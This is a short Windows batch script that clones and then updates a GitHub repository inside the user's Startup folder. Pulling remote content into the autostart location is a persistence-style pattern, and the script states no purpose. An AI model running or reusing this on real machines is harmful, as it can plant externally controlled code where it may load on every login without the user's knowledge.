@echo off
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
git clone https://github.com/Velox0/test.git
cd test
git fetch origin main
git merge origin/main
